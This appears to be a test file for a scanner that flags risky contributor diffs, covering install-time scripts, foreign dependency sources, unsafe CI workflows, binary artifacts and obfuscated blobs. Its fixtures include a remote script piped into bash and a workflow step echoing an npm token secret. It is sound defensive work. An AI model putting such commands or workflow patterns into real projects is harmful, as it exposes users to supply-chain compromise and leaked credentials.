import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import { mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { after, test } from 'node:test';

const script = join(process.cwd(), 'scripts/security/contributor-risk.mjs');
const workdir = mkdtempSync(join(tmpdir(), 'cn-contributor-risk-'));

after(() => {
  rmSync(workdir, { recursive: true, force: true });
});

interface Report {
  verdict: 'clean' | 'review' | 'block';
  counts: { high: number; medium: number; low: number };
  findings: Array<{ id: string; severity: string; file: string; line: number }>;
}

let counter = 0;

function review(diff: string): { status: number; report: Report; markdown: string } {
  counter += 1;
  const diffPath = join(workdir, `change-${counter}.diff`);
  const jsonPath = join(workdir, `report-${counter}.json`);
  const markdownPath = join(workdir, `report-${counter}.md`);
  writeFileSync(diffPath, diff);

  const result = spawnSync(
    process.execPath,
    [script, diffPath, '--json', jsonPath, '--markdown', markdownPath],
    { encoding: 'utf8' },
  );

  return {
    status: result.status ?? -1,
    report: JSON.parse(readFileSync(jsonPath, 'utf8')) as Report,
    markdown: readFileSync(markdownPath, 'utf8'),
  };
}

function newFile(path: string, lines: string[]): string {
  return [
    `diff --git a/${path} b/${path}`,
    'new file mode 100644',
    'index 0000000..1111111',
    '--- /dev/null',
    `+++ b/${path}`,
    `@@ -0,0 +1,${lines.length} @@`,
    ...lines.map((line) => `+${line}`),
    '',
  ].join('\n');
}

test('allows an ordinary source change', () => {
  const result = review(
    newFile('src/server/example.ts', [
      'export function add(left: number, right: number): number {',
      '  return left + right;',
      '}',
    ]),
  );

  assert.equal(result.status, 0);
  assert.equal(result.report.verdict, 'clean');
  assert.equal(result.report.findings.length, 0);
  assert.match(result.markdown, /Verdict: CLEAN/);
  assert.match(result.markdown, /<!-- cybernorf-contributor-risk -->/);
});

test('blocks remote content piped into a shell', () => {
  const result = review(
    newFile('scripts/bootstrap.sh', [
      '#!/bin/sh',
      'curl -sSfL https://example.test/install.sh | bash',
    ]),
  );

  assert.equal(result.status, 2);
  assert.equal(result.report.verdict, 'block');
  assert.ok(result.report.findings.some((item) => item.id === 'remote-shell-execution'));
});

test('blocks dangerous workflow permissions and pull_request_target', () => {
  const result = review(
    newFile('.github/workflows/release.yml', [
      'name: Release',
      'on: pull_request_target',
      'permissions: write-all',
      'jobs:',
      '  build:',
      '    runs-on: ubuntu-latest',
      '    steps:',
      '      - run: echo "${{ secrets.NPM_TOKEN }}"',
    ]),
  );

  assert.equal(result.status, 2);
  const ids = result.report.findings.map((item) => item.id);
  assert.ok(ids.includes('pull-request-target'));
  assert.ok(ids.includes('write-all-permissions'));
  assert.ok(ids.includes('secret-in-run-step'));
});

test('reports an unpinned action without blocking the merge', () => {
  const result = review(
    newFile('.github/workflows/test.yml', [
      'name: Test',
      'on: push',
      'jobs:',
      '  test:',
      '    runs-on: ubuntu-latest',
      '    steps:',
      '      - uses: actions/checkout@v4',
    ]),
  );

  assert.equal(result.status, 0);
  assert.equal(result.report.verdict, 'review');
  assert.ok(result.report.findings.some((item) => item.id === 'unpinned-action'));
});

test('blocks a new install-time lifecycle script', () => {
  const result = review(
    newFile('package.json', [
      '{',
      '  "scripts": {',
      '    "postinstall": "node ./scripts/setup.js"',
      '  }',
      '}',
    ]),
  );

  assert.equal(result.status, 2);
  assert.ok(result.report.findings.some((item) => item.id === 'install-lifecycle-script'));
});

test('blocks a dependency that resolves outside the registry', () => {
  const result = review(
    newFile('package.json', [
      '{',
      '  "dependencies": {',
      '    "telemetry": "https://cdn.example.test/telemetry.tgz"',
      '  }',
      '}',
    ]),
  );

  assert.equal(result.status, 2);
  assert.ok(result.report.findings.some((item) => item.id === 'dependency-from-direct-source'));
});

test('blocks a lockfile entry served from an unexpected source', () => {
  const result = review(
    newFile('package-lock.json', [
      '{',
      '  "packages": {',
      '    "node_modules/example": {',
      '      "version": "1.0.0",',
      '      "resolved": "https://packages.example.test/example-1.0.0.tgz"',
      '    }',
      '  }',
      '}',
    ]),
  );

  assert.equal(result.status, 2);
  assert.ok(result.report.findings.some((item) => item.id === 'lockfile-foreign-registry'));
});

test('blocks a binary artifact', () => {
  const result = review(newFile('tools/collector.exe', ['placeholder']));

  assert.equal(result.status, 2);
  assert.ok(result.report.findings.some((item) => item.id === 'binary-artifact'));
});

test('blocks removal of a security step from CI', () => {
  const diff = [
    'diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml',
    'index 1111111..2222222 100644',
    '--- a/.github/workflows/ci.yml',
    '+++ b/.github/workflows/ci.yml',
    '@@ -10,3 +10,2 @@ jobs:',
    '     runs-on: ubuntu-latest',
    '-      - run: npm audit --audit-level=low',
    '       - run: npm test',
    '',
  ].join('\n');

  const result = review(diff);
  assert.equal(result.status, 2);
  assert.ok(result.report.findings.some((item) => item.id === 'security-step-removed'));
});

test('blocks a long obfuscated blob', () => {
  // Assembled at runtime so this fixture itself is not an opaque blob.
  const blob = 'A'.repeat(300);
  const result = review(newFile('src/server/loader.ts', [`const payload = "${blob}";`]));

  assert.equal(result.status, 2);
  assert.ok(result.report.findings.some((item) => item.id === 'obfuscated-payload'));
});

test('reads added lines from a modified file without counting context', () => {
  const diff = [
    'diff --git a/src/server/thing.ts b/src/server/thing.ts',
    'index 1111111..2222222 100644',
    '--- a/src/server/thing.ts',
    '+++ b/src/server/thing.ts',
    '@@ -4,3 +4,4 @@ export function thing() {',
    '   const value = 1;',
    '+  const other = 2;',
    '   return value;',
    ' }',
    '',
  ].join('\n');

  const result = review(diff);
  assert.equal(result.status, 0);
  assert.equal(result.report.findings.length, 0);
});
